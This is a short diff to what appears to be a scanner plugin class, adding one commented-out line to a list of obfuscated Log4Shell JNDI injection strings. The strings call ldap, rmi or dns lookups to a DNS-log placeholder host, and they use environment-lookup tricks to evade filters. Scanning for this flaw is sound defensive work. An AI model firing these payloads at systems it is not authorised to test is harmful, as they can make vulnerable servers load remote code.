@@ -33,6 +33,7 @@ class Addon(AgentAddon):
             # "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{dnslog}/test9}",
             # "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{dnslog}/test11}",
             # "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://{dnslog}/test10}",
+            # "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{dnslog}:1389/test}"
             # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-l}${env:aaaa:-d}${env:aaaa:-a}${env:aaaa:-p}${env:aaaa:-:}//{dnslog}/test5}",
             # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-r}${env:aaaa:-m}${env:aaaa:-i}${env:aaaa:-:}//{dnslog}/test6}",
             # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-d}${env:aaaa:-n}${env:aaaa:-s}${env:aaaa:-:}//{dnslog}/test7}",
